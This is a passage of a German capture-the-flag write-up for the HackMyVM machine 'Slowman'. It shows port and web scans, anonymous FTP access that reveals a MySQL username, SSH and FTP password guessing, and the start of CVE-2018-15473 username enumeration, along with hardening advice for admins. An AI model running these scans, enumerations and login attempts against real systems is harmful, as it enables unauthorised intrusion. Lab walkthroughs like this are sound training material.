@@ -1,0 +1,1973 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Slowman - HackMyVM - Easy - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <!-- Header angepasst -->
+    <div class="header-bg">
+        <h1>Slowman - HackMyVM - Easy - Bericht</h1>
+        <div class="level-container">
+            <!-- Farbe Rot wird durch CSS gesteuert -->
+            <h2>Easy</h2>
+            <div class="circle">
+                <!-- Segmente für Rot -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Hintergrundfarbe wird durch CSS gesteuert -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Tools aus dem Bericht extrahiert -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">mysql</div>
+                <div class="tool-item">ftp</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">ssh-username-enum.py</div>
+                <div class="tool-item">dirb</div>
+                <div class="tool-item">hydra</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">zip2john</div>
+                <div class="tool-item">john</div>
+                <div class="tool-item">unzip</div>
+                <div class="tool-item">ll (ls -l)</div>
+                <div class="tool-item">echo</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">ss</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">msfconsole</div>
+                <div class="tool-item">rm</div>
+                <div class="tool-item">mkfifo</div>
+                <div class="tool-item">nc (Netcat)</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">chmod</div>
+                <div class="tool-item">pspy64</div>
+                <div class="tool-item">linpeas.sh</div>
+                <div class="tool-item">getcap</div>
+                <div class="tool-item">setcap</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">ssh-agent</div>
+                <div class="tool-item">su</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Inhaltsverzeichnis gemäß Struktur -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#proof-of-concept">Proof of Concept</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis"><strong>Analyse:</strong> Der Test beginnt mit einem `arp-scan -l`, um aktive Geräte im lokalen Netzwerk zu identifizieren.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Zielsystem "Slowman" wird mit der IP `192.168.2.113` und der MAC-Adresse `08:00:27:04:7d:c6` (Oracle VirtualBox) gefunden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ziel-IP notieren und für weitere Scans verwenden.<br><strong>Empfehlung (Admin):</strong> Netzwerküberwachung auf ARP-Scans und Segmentierung implementieren.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+192.168.2.113	08:00:27:04:7d:c6	PCS Systemtechnik GmbH
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Die `/etc/hosts`-Datei auf dem Angreifer-System wird bearbeitet, um der IP `192.168.2.113` den Hostnamen `slowman.hmv` zuzuweisen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Zuordnung erleichtert die Handhabung in nachfolgenden Schritten.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie den Hostnamen `slowman.hmv` für alle weiteren Aktionen.<br><strong>Empfehlung (Admin):</strong> Lokale Angreifer-Konfiguration, keine direkte Auswirkung auf das Ziel.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                    <pre>
+127.0.0.1	localhost
+192.168.2.113   slowman.hmv
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Webserver-Scanner `nikto` wird auf Port 80 des Ziels ausgeführt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Nikto identifiziert Apache/2.4.52 (Ubuntu), meldet fehlende Sicherheitsheader (`X-Frame-Options`, `X-Content-Type-Options`), ein mögliches ETag-Inode-Leak (CVE-2003-1418), eine veraltete Apache-Version und erlaubte HTTP-Methoden (inklusive des ungewöhnlichen `PTINS`). Wichtig ist auch, dass Directory Indexing für `/css/` und `/images/` gefunden wurde.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie die Verzeichnisse mit aktiviertem Directory Indexing. Notieren Sie die fehlenden Header und die veraltete Apache-Version für mögliche weitere Angriffe. Die `PTINS`-Methode ist ungewöhnlich und sollte genauer betrachtet werden.<br><strong>Empfehlung (Admin):</strong> Implementieren Sie die fehlenden Sicherheitsheader. Aktualisieren Sie Apache. Deaktivieren Sie Directory Indexing. Untersuchen und deaktivieren Sie ungewöhnliche HTTP-Methoden wie `PTINS`, falls nicht benötigt.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nikto -h 192.168.2.113</span></div>
+                    <pre>
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.113
++ Target Hostname:    192.168.2.113
++ Target Port:        80
++ Start Time:         2023-12-04 23:28:11 (GMT1)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.52 (Ubuntu)
++ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ /: Server may leak inodes via ETags, header found with file /, inode: 402e, size: 60ad6afe32cc0, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
++ Apache/2.4.52 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
++ OPTIONS: Allowed HTTP Methods: POST, OPTIONS, HEAD, GET .
++ /css/: Directory indexing found.
++ /css/: This might be interesting.
++ /images/: Directory indexing found.
++ 8102 requests: 0 error(s) and 8 item(s) reported on remote host
++ End Time:           2023-12-04 23:28:26 (GMT1) (15 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein umfassender Nmap-Scan (`-sS -sV -A -T5 -p-`) wird auf das Ziel durchgeführt, um alle offenen Ports, Dienste, Versionen und das Betriebssystem zu ermitteln.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Nmap findet vier offene Ports:
+                *   **21/tcp (FTP):** vsftpd 3.0.5, anonymer Login erlaubt, aber Verzeichnisliste schlägt fehl (Timeout).
+                *   **22/tcp (SSH):** OpenSSH 8.9p1 (Ubuntu).
+                *   **80/tcp (HTTP):** Apache httpd 2.4.52 (Ubuntu), Seitentitel "Fastgym".
+                *   **3306/tcp (MySQL):** MySQL 8.0.35 (Ubuntu), Authentifizierungsplugin `caching_sha2_password`.
+            Nmap liefert auch SSH-Hostkeys, OS-Vermutungen (Linux) und bestätigt die MAC-Adresse.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie jeden offenen Port: FTP (trotz Timeout beim Listing), SSH (Brute-Force, bekannte Schwachstellen), HTTP (Web-Enumeration) und MySQL (Versuch von Standard-/erratenen Logins, bekannte Schwachstellen). Der anonyme FTP-Zugang ist trotz des Listing-Problems interessant.<br><strong>Empfehlung (Admin):</strong> Deaktivieren Sie anonymen FTP-Zugriff, wenn nicht benötigt. Härten Sie SSH und Apache. Stellen Sie sicher, dass MySQL nicht von außen erreichbar ist, wenn nicht notwendig, und verwenden Sie starke Passwörter. Halten Sie alle Dienste aktuell.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sV -A -T5 192.168.2.113 -p-</span></div>
+                    <pre>
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-04 23:28 CET
+Nmap scan report for slowman.hmv (192.168.2.113)
+Host is up (0.00020s latency).
+Not shown: 65530 filtered tcp ports (no-response)
+PORT     STATE  SERVICE  VERSION
+20/tcp   closed ftp-data
+21/tcp   open   ftp      vsftpd 3.0.5
+| ftp-syst:
+|   STAT:
+| FTP server status:
+|      Connected to ::ffff:192.168.2.199
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 2
+|      vsFTPd 3.0.5 - secure, fast, stable
+|_End of status
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can't get directory listing: TIMEOUT
+22/tcp   open   ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 02:d6:5e:01:45:5b:8d:2d:f9:cb:0b:df:45:67:04:22 (ECDSA)
+|_  256 f9:ce:4a:75:07:d0:05:1d:fb:a7:a7:69:39:1b:08:10 (ED25519)
+80/tcp   open   http     Apache httpd 2.4.52 ((Ubuntu))
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+|_http-title: Fastgym
+3306/tcp open   mysql    MySQL 8.0.35-0ubuntu0.22.04.1
+| ssl-cert: Subject: commonName=MySQL_Server_8.0.35_Auto_Generated_Server_Certificate
+| Not valid before: 2023-11-22T19:44:52
+|_Not valid after:  2033-11-19T19:44:52
+|_ssl-date: TLS randomness does not represent time
+| mysql-info:
+|   Protocol: 10
+|   Version: 8.0.35-0ubuntu0.22.04.1
+|   Thread ID: 14
+|   Capabilities flags: 65535
+|   Some Capabilities: SupportsTransactions, InteractiveClient, Speaks41ProtocolOld, LongPassword, DontAllowDatabaseTableColumn, IgnoreSigpipes, LongColumnFlag, SwitchToSSLAfterHandshake, Support41Auth, SupportsLoadDataLocal, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, FoundRows, ConnectWithDatabase, ODBCClient, SupportsCompression, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
+|   Status: Autocommit
+|   Salt: \x17j%%.\x12q\x10}
+| eKqD\x14
+| [si`
+|_  Auth Plugin Name: caching_sha2_password
+MAC Address: 08:00:27:04:7D:C6 (Oracle VirtualBox virtual NIC)
+Device type: general purpose|storage-misc|WAP
+Running (JUST GUESSING): Linux 5.X|4.X|2.6.X|3.X (98%), HP embedded (89%), Ubiquiti AirOS 5.X (88%), Ubiquiti embedded (88%)
+OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/h:hp:p2000_g3 cpe:/o:ubnt:airos:5.2.6 cpe:/o:linux:linux_kernel:2.6.32 cpe:/h:ubnt:airmax_nanostation
+Aggressive OS guesses: Linux 5.0 - 5.4 (98%), Linux 4.15 - 5.8 (94%), Linux 5.1 (93%), Linux 2.6.32 - 3.13 (93%), Linux 2.6.39 (93%), Linux 5.0 - 5.5 (92%), Linux 2.6.22 - 2.6.36 (91%), Linux 3.10 - 4.11 (91%), Linux 5.0 (91%), Linux 3.10 (91%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 1 hop
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.20 ms slowman.hmv (192.168.2.113)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 27.85 seconds
+                    </pre>
+                </div>
+            </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Der vorherige Nmap-Scan wird wiederholt, diesmal aber mit `| grep open`, um nur die offenen Ports zu listen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Bestätigt die vier offenen Ports: 21 (FTP), 22 (SSH), 80 (HTTP), 3306 (MySQL).</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Diese gefilterte Ansicht ist nützlich für einen schnellen Überblick.<br><strong>Empfehlung (Admin):</strong> Keine neuen Erkenntnisse gegenüber dem vorherigen Scan.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sV -A -T5 192.168.2.113 -p- | grep open</span></div>
+                     <pre>
+21/tcp   open   ftp      vsftpd 3.0.5
+22/tcp   open   ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+80/tcp   open   http     Apache httpd 2.4.52 ((Ubuntu))
+3306/tcp open   mysql    MySQL 8.0.35-0ubuntu0.22.04.1
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <p class="analysis"><strong>Analyse:</strong> `gobuster` wird für eine Verzeichnis- und Dateisuche auf `http://slowman.hmv` verwendet. Es nutzt eine umfangreiche Liste von Erweiterungen (`-x`) und eine gängige Wortliste (`directory-list-2.3-medium.txt`).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Gobuster findet die Standard-Webseiten-Dateien (`index.html`, `contact.html`, `why.html`) sowie die Asset-Verzeichnisse (`images`, `css`, `js`). Keine offensichtlich versteckten oder ungewöhnlichen Pfade werden in diesem Durchlauf entdeckt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Analysieren Sie den Inhalt der gefundenen HTML-Dateien (Quellcode, sichtbarer Text). Untersuchen Sie die Verzeichnisse, für die Nikto Directory Indexing gemeldet hat (`/css/`, `/images/`).<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass keine sensiblen Informationen in den gefundenen Dateien/Verzeichnissen enthalten sind. Deaktivieren Sie Directory Indexing.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://slowman.hmv  -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx,bak,js -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"  -b '403,404' -e --no-error -k</span></div>
+                    <pre>
+http://slowman.hmv/index.html           (Status: 200) [Size: 16430]
+http://slowman.hmv/images               (Status: 301) [Size: 311] [--> http://slowman.hmv/images/]
+http://slowman.hmv/contact.html         (Status: 200) [Size: 5232]
+http://slowman.hmv/css                  (Status: 301) [Size: 308] [--> http://slowman.hmv/css/]
+http://slowman.hmv/js                   (Status: 301) [Size: 307] [--> http://slowman.hmv/js/]
+http://slowman.hmv/why.html             (Status: 200) [Size: 6115]
+                    </pre>
+                </div>
+            </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Mit `curl` wird eine HTTP-Anfrage mit der ungewöhnlichen Methode `PTINS` (von Nikto gemeldet) an den Webserver gesendet.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Server antwortet mit `200 OK` und listet `PST, PTINS, HEAD, GET` (vermutlich POST statt PST) im `Allow`-Header auf. Dies bestätigt, dass der Server diese ungewöhnliche Methode akzeptiert. Es ist unklar, was `PTINS` bewirkt, könnte aber auf eine Fehlkonfiguration oder eine versteckte Funktionalität hindeuten.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie, die `PTINS`-Methode weiter zu untersuchen. Senden Sie Anfragen mit dieser Methode an verschiedene Endpunkte und analysieren Sie die Antworten. Es könnte sich um eine Methode handeln, die zur Umgehung von Sicherheitsmaßnahmen oder zur Ausführung bestimmter Aktionen missbraucht werden kann.<br><strong>Empfehlung (Admin):</strong> Deaktivieren Sie alle nicht standardmäßigen und unnötigen HTTP-Methoden wie `PTINS` in der Apache-Konfiguration (`<LimitExcept GET POST HEAD OPTIONS>`).</p>
+           <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl -v -X PTINS http://192.168.2.113</span></div>
+                    <pre>
+*   Trying 192.168.2.113:80...
+* Connected to 192.168.2.113 (192.168.2.113) port 80
+> PTINS / HTTP/1.1
+> Host: 192.168.2.113
+> User-Agent: curl/8.4.0
+> Accept: */*
+>
+< HTTP/1.1 200 OK
+< Date: Mon, 04 Dec 2023 22:29:38 GMT
+< Server: Apache/2.4.52 (Ubuntu)
+< Allow: POST,PTINS,HEAD,GET
+< Content-Length: 0
+< Content-Type: text/html
+<
+* Connection #0 to host 192.168.2.113 left intact
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Manuelle Untersuchung des Quellcodes verschiedener HTML-Seiten (`why.html`, `index.html`, `trainer.html`) und Notizen zur verwendeten Technologie-Stack.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Quellcode-Analyse ergibt eine E-Mail-Adresse (`slowman@gmail.com`) und zwei Trainernamen (`Jean Doe`, `Jeff Den`). Die Technologie-Stack-Analyse (Google Fonts, Apache, Ubuntu, CDNs, jQuery, Bootstrap etc.) liefert Kontext, aber keine direkten Schwachstellen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die E-Mail-Adresse könnte für Phishing oder als potenzieller Benutzername verwendet werden. Die Trainernamen (`jean`, `jeff`) sind potenzielle Benutzernamen für Brute-Force-Angriffe.<br><strong>Empfehlung (Admin):</strong> Vermeiden Sie die Offenlegung von E-Mail-Adressen im Quellcode, wenn möglich. Seien Sie sich bewusst, dass öffentlich sichtbare Namen als Benutzernamen erraten werden können.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+view-source:http://slowman.hmv/why.html
+  slowman@gmail.com
+
+view-source:http://slowman.hmv/index.html
+  Our Gym Trainers
+
+view-source:http://slowman.hmv/trainer.html
+
+ Trainer Jean Doe
+ Trainer Jeff Den
+
+Schrift Script
+Google Font API
+
+Web Server
+Apache HTTP Server 2.4.52
+
+Betriebssysteme
+Ubuntu
+
+CDN
+cdnjs
+Cloudflare
+
+JavaScript Bibliotheken
+jQuery 3.4.1
+OWL Carousel
+
+UI Frameworks
+Bootstrap 4.3.1
+                     </pre>
+                  </div>
+              </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Es wird versucht, sich remote am MySQL-Server (`slowman.hmv`, Port 3306) als Benutzer `root` ohne Passwort anzumelden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Zugriff wird verweigert (`Access denied for user 'root'@'PC192-168-2-199'`). Dies zeigt, dass der MySQL-Server von extern erreichbar ist, aber der Root-Zugriff von dieser IP (oder generell von remote) nicht erlaubt ist oder ein Passwort erfordert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie, andere MySQL-Benutzernamen zu erraten oder zu finden (z.B. aus Webanwendungen, Konfigurationsdateien). Führen Sie Passwort-Brute-Force-Angriffe gegen gefundene Benutzernamen durch.<br><strong>Empfehlung (Admin):</strong> Beschränken Sie den Zugriff auf den MySQL-Server nur auf notwendige Hosts (z.B. `localhost` oder spezifische Anwendungsserver). Verwenden Sie starke Passwörter für alle MySQL-Benutzer. Deaktivieren Sie den Root-Remote-Login.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">mysql -h slowman.hmv -u root</span></div>
+                     <pre>
+ERROR 1045 (28000): Access denied for user 'root'@'PC192-168-2-199' (using password: NO)
+                     </pre>
+                  </div>
+              </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Anonymer Login auf dem FTP-Server (Port 21). Nach dem Login werden die Befehle `id` (nicht erlaubt) und `ls` ausgeführt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der anonyme Login ist erfolgreich. Im Gegensatz zum Nmap-Scan funktioniert das Auflisten des Verzeichnisses (`ls`) nun und zeigt eine Datei `allowedusersmysql.txt`. Der `id`-Befehl ist nicht erlaubt, was für FTP normal ist.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Datei `allowedusersmysql.txt` ist höchst interessant. Laden Sie sie sofort herunter und analysieren Sie den Inhalt.<br><strong>Empfehlung (Admin):</strong> Deaktivieren Sie anonymen FTP-Zugriff. Legen Sie niemals potenziell sensible Informationen wie Benutzerlisten in öffentlich zugänglichen Bereichen ab.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ftp 192.168.2.113</span></div>
+                    <pre>
+Connected to 192.168.2.113.
+220 (vsFTPd 3.0.5)
+Name (192.168.2.113:cyber): Anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+                    </pre>
+                    <div class="prompt ftp-prompt">ftp> <span class="command">id</span></div>
+                    <pre>550 Permission denied.</pre>
+                    <div class="prompt ftp-prompt">ftp> <span class="command">ls</span></div>
+                    <pre>
+200 EPRT command successful. Consider using EPSV.
+150 Here comes the directory listing.
+-rw-r--r--    1 0        0              12 Nov 22 21:46 allowedusersmysql.txt
+226 Directory send OK.
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Innerhalb der anonymen FTP-Sitzung wird versucht, eine Datei (`shell.sh`) hochzuladen (`put`). Es wird versucht, in verschiedene Verzeichnisse zu wechseln (`cd ~`, `cd /var`). Das aktuelle Verzeichnis wird geprüft (`pwd`) und die Zieldatei `allowedusersmysql.txt` heruntergeladen (`get`). Schließlich wird der Inhalt des aktuellen Verzeichnisses erneut detailliert aufgelistet (`ls -al`).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Upload schlägt fehl (Permission denied). Der Wechsel ins Wurzelverzeichnis (`/`) ist erfolgreich, aber der Wechsel nach `/var` schlägt fehl. Die Datei `allowedusersmysql.txt` wird erfolgreich heruntergeladen. Die Auflistung bestätigt, dass sich nur diese Datei im anonymen FTP-Root befindet.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Analysieren Sie die heruntergeladene Datei `allowedusersmysql.txt`. Der anonyme FTP scheint keine weiteren Angriffsflächen zu bieten.<br><strong>Empfehlung (Admin):</strong> Korrekte Konfiguration, dass anonyme Benutzer keine Schreibrechte haben und nicht beliebig navigieren können. Die Existenz der Informationsdatei ist jedoch problematisch.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt ftp-prompt">ftp> <span class="command">put shell.sh</span></div>
+                     <pre>
+local: shell.sh remote: shell.sh
+200 EPRT command successful. Consider using EPSV.
+550 Permission denied.
+                     </pre>
+                     <div class="prompt ftp-prompt">ftp> <span class="command">cd ~</span></div>
+                     <pre>250 Directory successfully changed.</pre>
+                     <div class="prompt ftp-prompt">ftp> <span class="command">pwd</span></div>
+                     <pre>Remote directory: /</pre>
+                     <div class="prompt ftp-prompt">ftp> <span class="command">cd /var</span></div>
+                     <pre>550 Failed to change directory.</pre>
+                     <div class="prompt ftp-prompt">ftp> <span class="command">get allowedusersmysql.txt</span></div>
+                     <pre>
+local: allowedusersmysql.txt remote: allowedusersmysql.txt
+200 EPRT command successful. Consider using EPSV.
+150 Opening BINARY mode data connection for allowedusersmysql.txt (12 bytes).
+100% |***********************************|    12       23.57 KiB/s    00:00 ETA
+226 Transfer complete.
+12 bytes received in 00:00 (16.09 KiB/s)
+                     </pre>
+                      <div class="prompt ftp-prompt">ftp> <span class="command">ls -al</span></div>
+                      <pre>
+200 EPRT command successful. Consider using EPSV.
+150 Here comes the directory listing.
+drwxr-xr-x    2 0        121          4096 Nov 22 21:46 .
+drwxr-xr-x    2 0        121          4096 Nov 22 21:46 ..
+-rw-r--r--    1 0        0              12 Nov 22 21:46 allowedusersmysql.txt
+226 Directory send OK.
+                     </pre>
+                     <div class="prompt ftp-prompt">ftp> <span class="command"></span></div>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Inhalt der heruntergeladenen Datei `allowedusersmysql.txt` wird mit `cat` angezeigt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Datei enthält den Text `<span class="password">trainerjeff</span>`. Dies ist höchstwahrscheinlich ein gültiger Benutzername für den MySQL-Dienst.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie diesen Benutzernamen (`trainerjeff`) für Anmeldeversuche am MySQL-Dienst (Port 3306). Versuchen Sie Standardpasswörter oder führen Sie einen Brute-Force-Angriff mit Hydra durch.<br><strong>Empfehlung (Admin):</strong> Speichern Sie niemals Benutzernamen oder andere sensible Daten in öffentlich zugänglichen Dateien.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat allowedusersmysql.txt</span></div>
+                    <pre>
+trainerjeff
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Es wird versucht, sich per FTP als Benutzer `jeff` mit dem Passwort `trainerjeff` anzumelden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Login schlägt fehl (`530 Login incorrect`). Der Benutzername oder das Passwort ist falsch für den FTP-Dienst.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Da `trainerjeff` explizit als MySQL-Benutzer identifiziert wurde, konzentrieren Sie die Angriffe mit diesem Namen auf MySQL.<br><strong>Empfehlung (Admin):</strong> Keine spezifische Aktion, da der Login fehlschlug.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ftp 192.168.2.113</span></div>
+                    <pre>
+Connected to 192.168.2.113.
+220 (vsFTPd 3.0.5)
+Name (192.168.2.113:cyber): jeff
+331 Please specify the password.
+Password: trainerjeff
+530 Login incorrect.
+ftp: Login failed
+                    </pre>
+                     <div class="prompt ftp-prompt">ftp> <span class="command">^D</span></div>
+                     <pre>221 Goodbye.</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Es wird versucht, sich per SSH als Benutzer `jeff` mit verschiedenen Passwörtern (implizit, eines davon `trainerjeff`) anzumelden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Login-Versuche schlagen fehl (`Permission denied`).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Konzentrieren Sie sich auf validierte Benutzernamen und systematische Passwort-Angriffe (z.B. Hydra), anstatt manuell zu raten.<br><strong>Empfehlung (Admin):</strong> Überwachen Sie fehlgeschlagene SSH-Logins und blockieren Sie Brute-Force-Versuche (z.B. mit `fail2ban`).</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh jeff@192.168.2.113</span></div>
+                    <pre>
+The authenticity of host '192.168.2.113 (192.168.2.113)' can't be established.
+ED25519 key fingerprint is SHA256:gyWF404zV4bL8gskLfXbChI0buZepNktuMGUNM23CHQ.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.2.113' (ED25519) to the list of known hosts.
+jeff@192.168.2.113's password:
+Permission denied, please try again.
+jeff@192.168.2.113's password: trainerjeff
+Permission denied, please try again.
+jeff@192.168.2.113's password:
+                    </pre>
+                </div>
+            </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Ein Python-Skript (`ssh-username-enum.py`, vermutlich basierend auf CVE-2018-15473) wird zur SSH-Benutzer-Enumeration verwendet. Es nutzt eine Wortliste (`../users.txt`) und ein Timeout (`-t 10`).</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Das Skript identifiziert eine lange Liste potenziell gültiger Benutzernamen auf dem SSH-Server, darunter die bereits bekannten `mike`, `trainerjeff` und `jeff`, sowie viele andere wie `daniel`, `ben`, `jean`, etc. Einige Benutzernamen führen zu Fehlern (`SSH negotiation failed`).</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Diese Liste erweitert die Anzahl der potenziellen Ziele für SSH-Brute-Force-Angriffe erheblich. Priorisieren Sie Namen, die im Kontext der Maschine sinnvoll erscheinen (`trainerjeff`, `jean`, `jeff`).<br><strong>Empfehlung (Admin):</strong> Aktualisieren Sie OpenSSH auf eine Version, die nicht für CVE-2018-15473 anfällig ist, oder konfigurieren Sie es so, dass diese Art der Enumeration erschwert wird.</p>
+           <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/cve-2018-15473]
+└─# <span class="command">./ssh-username-enum.py  -t 10 -w ../users.txt 192.168.2.113</span></div>
+                    <pre>
